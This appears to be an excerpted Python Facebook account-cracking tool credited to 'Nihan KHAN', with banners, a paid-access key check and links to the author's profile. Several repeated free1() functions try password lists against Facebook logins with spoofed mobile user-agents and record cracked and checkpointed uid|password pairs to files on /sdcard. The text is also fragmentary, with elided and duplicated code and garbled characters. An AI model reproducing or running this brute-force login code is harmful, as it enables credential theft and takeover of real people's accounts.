...
â•‘ Creator  : Nihan KHAN                       â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : Nihan KHAN                            â•‘
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : Nihan KHAN ")
    print("\t  Fb page  : NihanS COMMUNITY ")
    print("\t  Github   : Nihan48")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=Nihan"
        print("\n\t     [ Hello User ]\n")
        ...
        os.system("xdg-openhttps://www.facebook.com/profile.php?id=100089790850149&mibextid=ZbWKwL")
        exit()
...
â•‘ Creator  : Nihan KHAN                                 â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : Nihan KHAN  ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            Nihan YT                              â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
...
def menu_apikey():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-openhttps://www.facebook.com/profile.php?id=100089790850149&mibextid=ZbWKwL");xyz()
    elif hamii in ["3","03"]:
...
def password():
    ...
    print("")
    passX = input(f" {WHITE}CHOOSE{nihan} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100089790850149&mibextid=ZbWKwL")
        password1()
    elif passX in ['2','02']:
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[Nihan-OK] '+uid+' [âˆš] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[Nihan] '+uid+' [~] '+ps+' ')
                    open('/sdcard/nn.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[Nihan-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/nn-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[Nihan ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    print('\r\033[1;34m[Nihan] '+uid+' [~] '+ps+' ')
                    open('/sdcard/Nihan.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[Nihan ðŸ”¥] [%s] \33[1;97m[OK:%s{Nihan2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[Nihan-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/nn-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
